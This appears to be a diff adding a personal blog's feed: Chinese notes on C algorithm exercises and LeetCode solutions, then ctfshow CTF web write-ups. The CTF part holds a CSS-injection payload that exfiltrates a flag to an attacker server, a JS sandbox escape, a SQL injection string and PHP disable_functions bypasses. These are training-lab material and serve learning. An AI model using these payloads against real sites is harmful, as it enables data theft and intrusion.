+	calc(num - 1, x, y, z);
+	//将num-1个盘子，从x柱子借助y柱子运送到z柱子 
+}
+int main(){
+	int N;
+	scanf(&quot;%d&quot;, &amp;N);
+	calc(N, 'A', 'B', 'C');
+	//将 N 个盘子，从 A 柱子借助 B 柱子运送到 C 柱子
+}
+</code></pre>
+<h2 id="0x27-子文略略略">0x27 子文略略略</h2>
+<p>题目描述</p>
+<p>子文是 0 ，但是他不想当 0 ，他想变成另一个数 x。<br>
+子文能做的操作只有两个：<br>
+1.将自己 +1<br>
+2.将自己 ×2<br>
+子文想知道，自己变成 x 至少要经过几次操作。</p>
+<p>输入格式<br>
+第一行一个正整数 T，表示数据组数。<br>
+接下来 T 行，每行一个正整数 x，表示子文想变成的数。<br>
+输出格式<br>
+输出 TT行，每行一个数，表示答案。</p>
+<p>输入样例<br>
+2<br>
+5<br>
+13<br>
+输出样例<br>
+4<br>
+6<br>
+样例解释<br>
+0⟶+1​ 1⟶+1 ​2⟶×2​ 4⟶+1​ 5<br>
+0⟶+1 ​1⟶+1 ​2⟶+1​ 3⟶×2​ 6⟶×2​ 12⟶+1​ 13<br>
+数据规模与约定<br>
+对于 50% 的数据，T=1，<br>
+对于 75% 的数据，T≤1000，<br>
+对于 100% 的数据，T≤10^6。<br>
+在以上每种梯度的数据中，又满足：<br>
+对于 20% 的数据，x≤100，<br>
+对于 40% 的数据，x≤10^3，<br>
+对于 60% 的数据，x≤10^6，<br>
+对于 80% 的数据，x≤10^9，<br>
+对于 100% 的数据，1≤x≤10^18。<br>
+时空限制<br>
+1s，256MB</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;math.h&gt;
+
+int shortest(long long int x){
+	int cnt;
+	if(x==1){
+		return 1;
+	}
+	if(x%2==0){
+		cnt=shortest(x/2)+1;
+	}else{
+		cnt=shortest(x-1)+1;
+	}
+	return cnt;
+}
+
+int main(){
+	
+	int n;
+	int x;
+	scanf(&quot;%d&quot;,&amp;n);
+	while(n--){
+		scanf(&quot;%lld&quot;,&amp;x);
+		printf(&quot;%d\n&quot;,shortest(x));
+	}
+	
+	
+	return 0;
+} 
+</code></pre>
+<h2 id="0x28-二叉树的层次遍历">0x28 二叉树的层次遍历</h2>
+<p>描述<br>
+现在给出一棵二叉树，希望你输出它的层次遍历<br>
+输入<br>
+第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。<br>
+接下来 n 行，每行两个正整数 li, ri ​ ，分别表示节点 i 的左右孩子的编号。如果不存在左 / 右孩子，则以 −1 表示。两个数之间用一个空格隔开。<br>
+输出<br>
+输出对应二叉树的层次遍历<br>
+样例<br>
+输入<br>
+3<br>
+2 3<br>
+-1 -1<br>
+-1 -1<br>
+输出<br>
+1 2 3</p>
+<p>经典算法，使用队列和二叉树结构体实现。</p>
+<p>但这里输入的方式，可以用顺序表存储，直接输出。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+	
+	int n;
+	int a[1000] = {0};
+	a[0] = 1;
+	int i = 1;
+	scanf(&quot;%d&quot;,&amp;n);
+	while(n--){
+		scanf(&quot;%d %d&quot;,&amp;a[i],&amp;a[i+1]);
+		i += 2;
+	}
+	
+	for(int j=0;a[j]!=0;j++){
+		if(a[j]!=-1){
+			printf(&quot;%d &quot;,a[j]);
+		}
+		
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="0x29-三次点击删除">0x29 三次点击删除</h2>
+<p>描述<br>
+给定一个字符串，每次“点击”，可以把字符串中“一对”相邻两个相同字母消除，例如，字符串&quot;abbc&quot;一次点击后可以生成&quot;ac&quot;，“aabcc”一次点击后可以生成“bcc”。但相同而不相邻、不相同的相邻字母都是不可以被消除的。编程实现输出给定字符串三次点击后的最终形态。<br>
+注意：（1）若三次点击消除后，仍存在相邻两个字母相同的情况，则输出0。（2）若最终的字符串为空串，则输出0。<br>
+输入<br>
+一个字符串，仅由小写字母组成。（字符串长度不大于300000）<br>
+输出<br>
+一个字符串，为“点击消除”后的最终形态。<br>
+样例<br>
+输入<br>
+abbc<br>
+输出<br>
+ac</p>
+<p>关键难点在于模拟删除，如abccba类型的，会变成  abba   aa    null。</p>
+<p>用栈的形式模拟比较字符，指针往后移动循环找相同字符（被比较字符），若找到，则把比较字符删除，即栈顶-1，并且继续往后比较。</p>
+<p>cnt记录消除次数。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int eliminate(char *str) {
+    int top = -1; // 模拟栈顶指针
+    int cnt = 0;
+    for (int i = 0; str[i] != '\0'; i++) {
+        if (top &gt;= 0 &amp;&amp; str[top] == str[i]) {
+            // 如果栈顶字符与当前字符相同，则消除
+            top--;
+            cnt++;
+        } else {
+            // 否则将当前字符放入栈顶
+            str[++top] = str[i];
+        }
+    }
+    str[top + 1] = '\0'; // 结束符
+    return cnt;
+}
+
+int main(){
+	char string[300001];
+	while(scanf(&quot;%s&quot;,string)!=EOF){
+		int cnt = eliminate(string);
+		if(cnt&gt;3||strlen(string)==0){
+			printf(&quot;0\n&quot;);
+	
+		}else{
+			printf(&quot;%s\n&quot;,string);
+		}
+	}
+	return 1;
+	
+}
+</code></pre>
+<h2 id="0x30-二叉排序树">0x30 二叉排序树</h2>
+<p>描述<br>
+试写一个判别给定二叉树是否为二叉排序树的算法<br>
+输入<br>
+第 1 ~ N 行 在第i行有三个数Li,Ri,Vi，分别表示第i-1个点的左儿子下标，右儿子下标和值。如果第i-1个点左儿子不存在则Li=0，右儿子同理。数据保证Vi互不相同且输入的为一颗合法树。<br>
+第 N+1 行为一个正整数 N表示树有N个点<br>
+输出<br>
+如果树为合法二叉排序树输出N个数，用空格分隔，表示所有点从小到大排序后的数组。如果树不为合法二叉树则输出一个空行。<br>
+样例<br>
+输入<br>
+2 3 5<br>
+0 4 3<br>
+0 0 7<br>
+0 0 4<br>
+4<br>
+输出<br>
+3 4 5 7</p>
+<p>二叉树的构造，中序遍历二叉树。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+
+struct Tree
+{
+	int data;
+	int L;
+	int R;
+	struct Tree *left;
+	struct Tree *right; 
+};
+
+void Inorder(struct Tree *head)
+{
+	if(head!=NULL)
+	{
+	    Inorder(head-&gt;left);
+	    printf(&quot;%d &quot;,head-&gt;data);
+	    Inorder(head-&gt;right);
+	}
+}
+
+struct Tree *creat()
+{
+	struct Tree *P[20000]={0};
+	int num=0;
+	int L,R,V;
+	int i;
+	while(scanf(&quot;%d&quot;,&amp;L),L!=num)
+	{
+	    scanf(&quot;%d %d&quot;,&amp;R,&amp;V);
+	    num++;
+	    struct Tree *q=(struct Tree*)malloc(sizeof(struct Tree));
+	    q-&gt;data=V;
+	    q-&gt;L=L;
+	    q-&gt;R=R;
+	    q-&gt;left=NULL;
+	    q-&gt;right=NULL;
+	    P[num]=q;
+	}
+	for(i=1;i&lt;num;i++)
+	{
+	    L=P[i]-&gt;L;
+	    R=P[i]-&gt;R;
+	    if(L!=0)
+	    {
+	        P[i]-&gt;left=P[L];
+	        if(P[i]-&gt;data&lt;P[L]-&gt;data)
+	        {
+	            return NULL;
+	        }
+	    }
+	    if(R!=0)
+	    {
+	        P[i]-&gt;right=P[R];
+	        if(P[i]-&gt;data&gt;P[R]-&gt;data)
+	        {
+	            return NULL;
+	        }
+	    }
+	}
+	return P[1];
+}
+
+int main()
+{
+	struct Tree *head=creat();
+	Inorder(head);
+	return 0;
+}
+
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[LeetCode热题100]]></title>
+        <id>https://fallingskies22.github.io/post/leetcode-re-ti-100/</id>
+        <link href="https://fallingskies22.github.io/post/leetcode-re-ti-100/">
+        </link>
+        <updated>2025-03-06T09:11:46.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="哈希">哈希</h1>
+<h2 id="两数之和">两数之和</h2>
+<ol>
+<li>
+<p>暴力求解方法略，两个for</p>
+</li>
+<li>
+<p>哈希表方法<br>
+<code>#include &lt;uthash.h&gt;</code></p>
+</li>
+</ol>
+<pre><code class="language-c">/**
+ * Note: The returned array must be malloced, assume caller calls free().
+ */
+
+
+struct hashTable{
+    int key;
+    int val;
+    UT_hash_handle hh;
+}
+
+struct hashTable* hashTable;
+
+struct hashTable* find(int ikey){
+    struct hashTable* tmp;
+    HASH_FIND_INT(hashTable, &amp;ikey, tmp);
+    retrun tmp;
+}
+
+void insert(int ikey, int ival){
+    struct hashTable* it = find(ikey);
+    if(it == NULL){
+        struct hashTable* tmp = malloc(sizeof(struct hashTable));
+        tmp-&gt;key = ikey, tmp-&gt;val = ival;
+        HASH_ADD_INT(hashTable,key,tmp);
+    }else{
+        it-&gt;val = ival;
+    }
+}
+
+int* twoSum(int* nums, int numsSize, int target, int* returnSize) {
+    hashTable = NULL;
+    for(int i=0;i&lt;numsSize;i++){
+        struct hashTable* it = find(target-nums[i]);
+        if(it != NULL){
+            int* ret = malloc(sizeof(int)*2);
+            ret[0]=it-&gt;val,ret[1]=i;
+            *returnSize = 2;
+            return ret;
+        }
+        insert(nums[i],i);
+    }
+    *returnSize = 0;
+    return NULL;
+}
+</code></pre>
+<h2 id="字母异位词分组">字母异位词分组</h2>
+<p>太难了，不看。。</p>
+<h2 id="最长连续序列">最长连续序列</h2>
+<p>依次读取数字，加入哈希表<br>
+遍历哈希表，如果有x-1，则跳过。<br>
+否则，循环找x+1，取最大长度。</p>
+<pre><code class="language-c">struct HashEntry{
+    int key;
+    UT_hash_handle hh;
+};
+
+int longestConsecutive(int* nums, int numsSize) {
+    struct HashEntry* hashSet = NULL;
+    struct HashEntry* e;
+
+    for(int i=0;i&lt;numsSize;i++){
+        HASH_FIND_INT(hashSet, &amp;nums[i],e);
+        if(e == NULL){
+            e = malloc(sizeof(struct HashEntry));
+            e-&gt;key = nums[i];
+            HASH_ADD_INT(hashSet, key, e);
+        }
+    }
+
+    int ans = 0;
+    struct HashEntry* next;
+    HASH_ITER(hh, hashSet,e,next){
+        int x = e-&gt;key;
+        int y = x-1;
+        HASH_FIND_INT(hashSet, &amp;y, e);
+        if(e){
+            continue;
+        }
+        y = x;
+        do {
+            y++;
+            HASH_FIND_INT(hashSet, &amp;y, e);
+        }while(e);
+
+        ans = fmax(ans, y-x);
+    }
+
+    HASH_CLEAR(hh, hashSet);
+    return ans;
+}
+</code></pre>
+<h1 id="双指针">双指针</h1>
+<h2 id="移动零">移动零</h2>
+<p>个人做法<br>
+0移到最后，其余数字往前移。</p>
+<pre><code class="language-c">void moveZeroes(int* nums, int numsSize) {
+    int end = numsSize-1;
+    int start = 0;
+    for(int i=0;i&lt;=end;i++){
+        if(nums[i] == 0){
+            for(int j=i;j&lt;end;j++){
+                nums[j] = nums[j+1];
+            }
+            nums[end] = 0;
+            i--;
+            end--;
+        }
+    }
+    
+}
+</code></pre>
+<p>双指针做法</p>
+<p>左指针指向当前已经处理好的序列的尾部。左指针左边均为非零数；<br>
+右指针指向待处理序列的头部。右指针左边直到左指针处均为零。</p>
+<pre><code class="language-c">void swap(int *a, int *b){
+    int t = *a;
+    *a = *b, *b = t;
+}
+
+
+void moveZeroes(int* nums, int numsSize) {
+    int left = 0, right = 0;
+    while(right &lt; numsSize){
+        if(nums[right]){
+            swap(nums + left, nums + right);
+            left++;
+        }
+        right++;
+    }
+
+    
+}
+</code></pre>
+<h2 id="盛最多水的容器">盛最多水的容器</h2>
+<p>指针指向两端，当移动长的那根时，容量不会增大。<br>
+所以移动小的那根，不会漏掉更大的容量。<br>
+最后比较，取最大。</p>
+<pre><code class="language-c">int maxArea(int* height, int heightSize) {
+    int start = 0, end = heightSize-1;
+    int max = 0;
+    while(start!=end){
+        int v = (end-start)*fmin(height[start],height[end]);
+        max = fmax(v,max);
+        if(height[start]&lt;height[end]){
+            start++;
+        }else{
+            end--;
+        }
+
+    }
+    return max;
+}
+</code></pre>
+<h1 id="二叉树">二叉树</h1>
+<h2 id="二叉树的中序遍历">二叉树的中序遍历</h2>
+<pre><code class="language-c">/**
+ * Definition for a binary tree node.
+ * struct TreeNode {
+ *     int val;
+ *     struct TreeNode *left;
+ *     struct TreeNode *right;
+ * };
+ */
+/**
+ * Note: The returned array must be malloced, assume caller calls free().
+ */
+void inorder(struct TreeNode* root, int* res, int* resSize){
+    if(root!=NULL){
+        inorder(root-&gt;left,res,resSize);
+        res[(*resSize)++] = root-&gt;val;
+        inorder(root-&gt;right,res,resSize);
+    }
+}
+
+int* inorderTraversal(struct TreeNode* root, int* returnSize) {
+    int* res = malloc(sizeof(int)*100);
+    *returnSize = 0;
+    inorder(root, res, returnSize);
+    return res;
+}
+</code></pre>
+<h2 id="二叉树的最大深度">二叉树的最大深度</h2>
+<pre><code class="language-c">/**
+ * Definition for a binary tree node.
+ * struct TreeNode {
+ *     int val;
+ *     struct TreeNode *left;
+ *     struct TreeNode *right;
+ * };
+ */
+int maxDepth(struct TreeNode *root) {
+    if (root == NULL) return 0;
+    return fmax(maxDepth(root-&gt;left), maxDepth(root-&gt;right)) + 1;
+}
+</code></pre>
+<h1 id="翻转二叉树">翻转二叉树</h1>
+<pre><code class="language-c">/**
+ * Definition for a binary tree node.
+ * struct TreeNode {
+ *     int val;
+ *     struct TreeNode *left;
+ *     struct TreeNode *right;
+ * };
+ */
+struct TreeNode* invertTree(struct TreeNode* root) {
+    if(root == NULL){
+        return NULL;
+    }
+    
+    struct TreeNode* left = invertTree(root-&gt;left);
+    struct TreeNode* right = invertTree(root-&gt;right);
+    root-&gt;left = right;
+    root-&gt;right = left;
+    return root;
+}
+</code></pre>
+<h2 id="对称二叉树">对称二叉树</h2>
+<pre><code class="language-c">/**
+ * Definition for a binary tree node.
+ * struct TreeNode {
+ *     int val;
+ *     struct TreeNode *left;
+ *     struct TreeNode *right;
+ * };
+ */
+
+bool check(struct TreeNode* p,struct TreeNode* q){
+    if(!p &amp;&amp; !q) return true; //两个节点都不存在
+    if(!p || !q) return false;//有一个节点不存在
+    return p-&gt;val == q-&gt;val &amp;&amp; check(p-&gt;left, q-&gt;right) &amp;&amp; check(p-&gt;right, q-&gt;left);
+}
+bool isSymmetric(struct TreeNode* root) {
+    return check(root-&gt;left, root-&gt;right);
+}
+</code></pre>
+<h2 id="二叉树的直径">二叉树的直径</h2>
+<p>同求二叉树深度，在代码中增加取左右子树深度和的最大值。</p>
+<pre><code class="language-c">/**
+ * Definition for a binary tree node.
+ * struct TreeNode {
+ *     int val;
+ *     struct TreeNode *left;
+ *     struct TreeNode *right;
+ * };
+ */
+
+int ans;
+int depth(struct TreeNode* root){
+    if(root == NULL){
+        return 0;
+    }
+
+    int L = depth(root-&gt;left);
+    int R = depth(root-&gt;right);
+
+    ans = fmax(ans, L+R);
+    return fmax(L,R)+1;
+}
+
+int diameterOfBinaryTree(struct TreeNode* root) {
+    ans = 0;
+    depth(root);
+    return ans;
+}
+</code></pre>
+<h1 id="技巧">技巧</h1>
+<h2 id="只出现一次的数字">只出现一次的数字</h2>
+<p>异或运算，偶数次出现的数字都被消除。</p>
+<pre><code class="language-c">int singleNumber(int* nums, int numsSize) {
+    int single = 0;
+    for(int i=0;i&lt;numsSize;i++){
+        single ^= nums[i];
+    }
+    return single;
+}
+</code></pre>
+<h2 id="多数元素">多数元素</h2>
+<p>方法一：排序后，去中值</p>
+<p>使用快速排序</p>
+<pre><code class="language-c">int cmp(const void* a, const void *b){
+    return *(int *)a - *(int*)b;
+}
+
+
+int majorityElement(int* nums, int numsSize) {
+    qsort(nums, numsSize,sizeof(int),cmp);
+    return nums[numsSize/2];
+}
+</code></pre>
+<p>方法二：同归于尽消杀法</p>
+<p>https://leetcode.cn/problems/majority-element/solutions/3043071/duo-shu-yuan-su-by-magical-vvingxna-qtgz</p>
+<pre><code class="language-c">int majorityElement(int* nums, int numsSize) {
+    int flag=nums[0];
+    int flagnum=0;
+    int i=0;
+    while(i&lt;numsSize){
+        if(nums[i]==flag){
+            flagnum++;
+        }else{
+            if(flagnum==0){
+                flag=nums[i];
+                flagnum++;
+            }else{
+                flagnum--;
+            }
+        }
+        i++;
+    }
+    return flag;
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[N诺] 计算机考研机试高分篇]]></title>
+        <id>https://fallingskies22.github.io/post/n-nuo-ji-suan-ji-kao-yan-ji-shi-gao-fen-pian/</id>
+        <link href="https://fallingskies22.github.io/post/n-nuo-ji-suan-ji-kao-yan-ji-shi-gao-fen-pian/">
+        </link>
+        <updated>2025-02-27T03:35:01.000Z</updated>
+        <content type="html"><![CDATA[<p>https://noobdream.com/News/new/43/</p>
+<h1 id="入门经典">入门经典</h1>
+<h2 id="简单模拟">简单模拟</h2>
+<h2 id="进制转换类问题">进制转换类问题</h2>
+<h3 id="负二进制">负二进制</h3>
+<pre><code class="language-c">
+#define _CRT_SECURE_NO_WARNINGS
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    int i;
+    while (scanf(&quot;%d&quot;, &amp;i) != EOF) {
+        int remain[100] = { 0 };
+        int num = 0;
+        while (1) {
+            remain[num] = i % -2;
+
+            if (remain[num] == -1) {
+                remain[num] = 1;
+                i = i / -2 + 1;
+            }
+            else {
+                i = i / -2;
+            }
+
+            num++;
+            if (i == 0) {
+                break;
+            }
+        }
+        for (int k = num - 1; k &gt;= 0; k--) {
+            printf(&quot;%d&quot;, remain[k]);
+        }
+        printf(&quot;\n&quot;);
+    }
+    return 0;
+}
+</code></pre>
+<h3 id="十进制和二进制">十进制和二进制</h3>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]大赛原题 - 2]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowda-sai-yuan-ti-2/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowda-sai-yuan-ti-2/">
+        </link>
+        <updated>2024-08-29T09:19:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web700">web700</h2>
+<blockquote>
+<p>CSS注入</p>
+</blockquote>
+<p>详细分析参考<a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">Better Exfiltration via HTML Injection</a><br>
+使用脚本<a href="https://github.com/sudiptadeb/cssexfil">cssexfil</a></p>
+<p>修改下脚本</p>
+<pre><code>chars = '{-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz}'
+
+input[name=flag][value^=&quot;%s&quot;]{ background-image: url(&quot;http://ip:port/savetoken?token=%s&quot;); } \n
+
+app.run(host='0.0.0.0', port=9000)
+</code></pre>
+<p>这里的<code>@import url()</code>是用来实现自动化，循环请求的，但是这里使用时没法实现。（不知道啥问题）</p>
+<p>就使用手动方法了😭<br>
+在vps中启动<code>python3 main.py</code></p>
+<p>然后手动循环请求</p>
+<pre><code>POST /crawl.html HTTP/1.1
+
+css=http://47.109.140.38:9000/gethack.css
+</code></pre>
+<p>在vps中查看到flag。</p>
+<h2 id="web701">web701</h2>
+<blockquote>
+<p>NodeJS<br>
+JS jail</p>
+</blockquote>
+<pre><code class="language-js">const express = require('express');
+const path = require('path');
+const vm = require('vm');
+
+const app = express();
+
+app.set('views', path.join(__dirname, 'views'));
+app.set('view engine', 'pug');
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.get('/', function (req, res, next) {
+  let output = '';
+  const code = req.query.code + '';
+  if (code &amp;&amp; code.length &lt; 200 &amp;&amp; !/[^a-z().]/.test(code)) {
+    try {
+      const result = vm.runInNewContext(code, {}, { timeout: 500 });
+      if (result === 1337) {
+        output = process.env.FLAG;
+      } else {
+        output = 'nope';
+      }
+    } catch (e) {
+      output = 'nope';
+    }
+  } else {
+    output = 'nope';
+  }
+  res.render('index', { title: '[a-z().]', output });
+});
+
+app.get('/source', function (req, res) {
+  res.sendFile(path.join(__dirname, 'app.js'));
+});
+
+module.exports = app;
+</code></pre>
+<p>限制执行js的字符。参考文章<a href="https://gist.github.com/stypr/9219055eaaf39bc1c3cdd694755d9295">Harekaze CTF 2019 WEB Writeup</a></p>
+<p>需要构造如下格式</p>
+<pre><code>Number(String(Number(1)).concat(3).concat(3).concat(7))
+</code></pre>
+<p>使用下面的方式获取数字及函数</p>
+<pre><code>constructor.length.constructor = Number()
+constructor.name.constructor = String()
+constructor.constructor.length = 1
+console.dir.name.length =&gt; &quot;dir&quot;.length = 3
+console.context.name.length =&gt; &quot;context&quot;.length = 7
+</code></pre>
+<p>payload</p>
+<pre><code>constructor.length.constructor(constructor.name.constructor(constructor.constructor.length).concat(console.dir.name.length).concat(console.dir.name.length).concat(console.context.name.length))
+</code></pre>
+<h2 id="web702">web702</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]大赛原题 - 1]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowda-sai-yuan-ti/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowda-sai-yuan-ti/">
+        </link>
+        <updated>2024-08-21T17:12:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web680">web680</h2>
+<blockquote>
+<p>PHP代码执行<br>
+disable_functions绕过</p>
+</blockquote>
+<p>先使用<code>phpinfo()</code>，发现有一堆<code>disable_functions</code></p>
+<pre><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir
+</code></pre>
+<p>在蚁剑中查看目录需要用到<code>opendir</code>,<code>readdir</code>,<code>closedir</code>。</p>
+<p>这里还有一个<a href="https://www.php.net/manual/zh/function.scandir.php">scandir</a>函数是可以列出指定路径中的文件和目录</p>
+<pre><code>code=var_dump(scandir(&quot;.&quot;));
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1724294340073.png" alt="" loading="lazy"></figure>
+<p>读取文件使用<a href="https://www.php.net/manual/zh/function.highlight-file.php">highlight_file</a></p>
+<pre><code>code=highlight_file(secret_you_never_know);
+</code></pre>
+<h2 id="web681">web681</h2>
+<blockquote>
+<p>SQL注入</p>
+</blockquote>
+<p>根据回显提示</p>
+<pre><code>select count(*) from ctfshow_users where username = '$name' or nickname = '$name'
+</code></pre>
+<p><code>'</code>被过滤了，使用<code>\</code>转义<code>'</code>来注入。</p>
+<p>payload</p>
+<pre><code>name=||1=1#\
+</code></pre>
+<h2 id="web682">web682</h2>
+<blockquote>
+<p>JS混淆加密<br>
+反调试</p>
+</blockquote>
+<p>这里采用的是<a href="https://github.com/javascript-obfuscator/javascript-obfuscator">JavaScript obfuscator</a></p>
+<p>使用反混淆的<a href="https://obf-io.deobfuscate.io/">在线网站</a></p>
+<pre><code class="language-js">eval(function (_0x511e23, _0xa7df9a, _0x1ec6e8, _0x334e7c, _0x20ea53, _0x455db4) {
+  _0x20ea53 = function (_0x241f82) {
+    return _0x241f82.toString(_0xa7df9a);
+  };
+  if (!''.replace(/^/, String)) {
+    while (_0x1ec6e8--) {
+      _0x455db4[_0x20ea53(_0x1ec6e8)] = _0x334e7c[_0x1ec6e8] || _0x20ea53(_0x1ec6e8);
+    }
+    _0x334e7c = [function (_0x2a38d4) {
+      return _0x455db4[_0x2a38d4];
+    }];
+    _0x20ea53 = function () {
+      return &quot;\\w+&quot;;
+    };
+    _0x1ec6e8 = 0x1;
+  }
+  ;
+  while (_0x1ec6e8--) {
+    if (_0x334e7c[_0x1ec6e8]) {
+      _0x511e23 = _0x511e23.replace(new RegExp(&quot;\\b&quot; + _0x20ea53(_0x1ec6e8) + &quot;\\b&quot;, 'g'), _0x334e7c[_0x1ec6e8]);
+    }
+  }
+  return _0x511e23;
+}(&quot;(3(){(3 a(){7{(3 b(2){9((''+(2/2)).5!==1||2%g===0){(3(){}).8('4')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();&quot;, 0x11, 0x11, '||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20'.split('|'), 0x0, {}));
+
+//将16进制数转为数字,长度只能为1，不然返回0
+var c2n = _0x1d65f5 =&gt; {
+  if (_0x1d65f5.length &gt; 0x1) {
+    return 0x0;
+  }
+  if (_0x1d65f5.charCodeAt() &gt; 0x60 &amp;&amp; _0x1d65f5.charCodeAt() &lt; 0x67) {
+    return _0x1d65f5.charCodeAt() - 0x57;
+  }
+  if (parseInt(_0x1d65f5) &gt; 0x0) {
+    return parseInt(_0x1d65f5);
+  }
+  return 0x0;
+};
+
+//将每位数加到一起
+var s2n2su = _0x511796 =&gt; {
+  r = 0x0;
+  for (var _0x28ce10 = _0x511796.length - 0x1; _0x28ce10 &gt;= 0x0; _0x28ce10--) {
+    r += c2n(_0x511796[_0x28ce10]);
+  }
+  return r;
+};
+
+function test() {
+  var _0x4bf698 = document.getElementById(&quot;message&quot;).value;
+  if (sha256(_0x4bf698) !== 'e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d') {  //sha256校验
+    return alert('error');
+  }
+  var _0x15409a = _0x4bf698.substring(0x0, 0x8);
+  if (_0x15409a !== &quot;ctfshow{&quot;) {   //开头为ctfshow{
+    return alert('error');
+  }
+  }
+  if (_0x4bf698.substring(_0x4bf698.length, _0x4bf698.length - 0x1) !== '}') { //结尾为}
+    return alert('error');
+  }
+  var _0xa109f6 = _0x4bf698.substring(0x8, _0x4bf698.length - 0x1); //中间值长度为0x24
+  if (_0xa109f6.length !== 0x24) {
+    return alert('error');
+  }
+  var _0x3f5e35 = _0xa109f6.split('-');  //使用-将中间值分割为5段
+  if (_0x3f5e35.length !== 0x5) {
+    return alert('error');
+  }
+  if (s2n2su(_0x3f5e35[0x0]) !== 0x3f) {  //第一段
+    return alert('error');
+  }
+  if (sha256(_0x3f5e35[0x0].substr(0x0, 0x4)) !== &quot;c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400&quot;) {  //第一段的前四位sha256值，解出来为592b
+    return alert('error');
+  }
+  if (sha256(_0x3f5e35[0x0].substr(0x4, 0x8)) !== 'f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc') {  //第一段的后四位sha256值，解出来为9d77
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x1][0x0]) !== c2n('a') - 0x1) { //第二段的第1位为9
+    return alert('error');
+  }
+  if (_0x3f5e35[0x1][0x1] + _0x3f5e35[0x1][0x2] + _0x3f5e35[0x1][0x3] !== &quot;dda&quot;) {  //第三段134位为430  左边是10进制右边是16进制
+    return alert('error');
+  }
+  if (_0x3f5e35[0x2][0x1] !== 'e') {  //第三段的第2位为e
+    return alert('error');
+  }
+  if (_0x3f5e35[0x2][0x0] + _0x3f5e35[0x2][0x2] + _0x3f5e35[0x2][0x3] != 0x1ae) {  //第三段134位为1ae
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x3][0x0]) !== c2n('a') - 0x1) {  //第四段的第1位为9
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x3][0x1]) !== parseInt(_0x3f5e35[0x3][0x3])) {  //第四段的第2位和第4位相等
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x3][0x3]) * 0x2 + c2n('a') !== 0x12) {  //第四段的第4位为4
+    return alert('error');
+  }
+  if (sha224(_0x3f5e35[0x3][0x2]) !== &quot;abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5&quot;) {  //第四段第三位sha224值，解出来为a
+    return alert('error');
+  }
+  if (st3(_0x3f5e35[0x4]) !== &quot;GVSTMNDGGQ2DSOLBGUZA====&quot;) {  //第五段为5e64f4499a52
+    return alert('error');
+  }
+  alert(&quot;you are right&quot;);
+}
+const Base64 = {
+  '_keyStr': &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;,
+  'encode': function (_0x1b46bf) {
+    var _0x1630dc = '';
+    var _0x393cc5;
+    var _0x201a2c;
+    var _0x42e93f;
+    var _0x13c018;
+    var _0x4de829;
+    var _0x165e47;
+    var _0x38f23e;
+    var _0x67b74e = 0x0;
+    _0x1b46bf = Base64._utf8_encode(_0x1b46bf);
+    while (_0x67b74e &lt; _0x1b46bf.length) {
+      _0x393cc5 = _0x1b46bf.charCodeAt(_0x67b74e++);
+      _0x201a2c = _0x1b46bf.charCodeAt(_0x67b74e++);
+      _0x42e93f = _0x1b46bf.charCodeAt(_0x67b74e++);
+      _0x13c018 = _0x393cc5 &gt;&gt; 0x2;
+      _0x4de829 = (_0x393cc5 &amp; 0x3) &lt;&lt; 0x4 | _0x201a2c &gt;&gt; 0x4;
+      _0x165e47 = (_0x201a2c &amp; 0xf) &lt;&lt; 0x2 | _0x42e93f &gt;&gt; 0x6;
+      _0x38f23e = _0x42e93f &amp; 0x3f;
+      if (isNaN(_0x201a2c)) {
+        _0x165e47 = _0x38f23e = 0x40;
+      } else if (isNaN(_0x42e93f)) {
+        _0x38f23e = 0x40;
+      }
+      _0x1630dc = _0x1630dc + this._keyStr.charAt(_0x13c018) + this._keyStr.charAt(_0x4de829) + this._keyStr.charAt(_0x165e47) + this._keyStr.charAt(_0x38f23e);
+    }
+    return _0x1630dc;
+  },
+  'decode': function (_0x38afb7) {
+    var _0x4e6b84 = '';
+    var _0x2b6149;
+    var _0x3edd27;
+    var _0x5f1062;
+    var _0x665708;
+    var _0x2fc104;
+    var _0x4ec53d;
+    var _0x9d69a0;
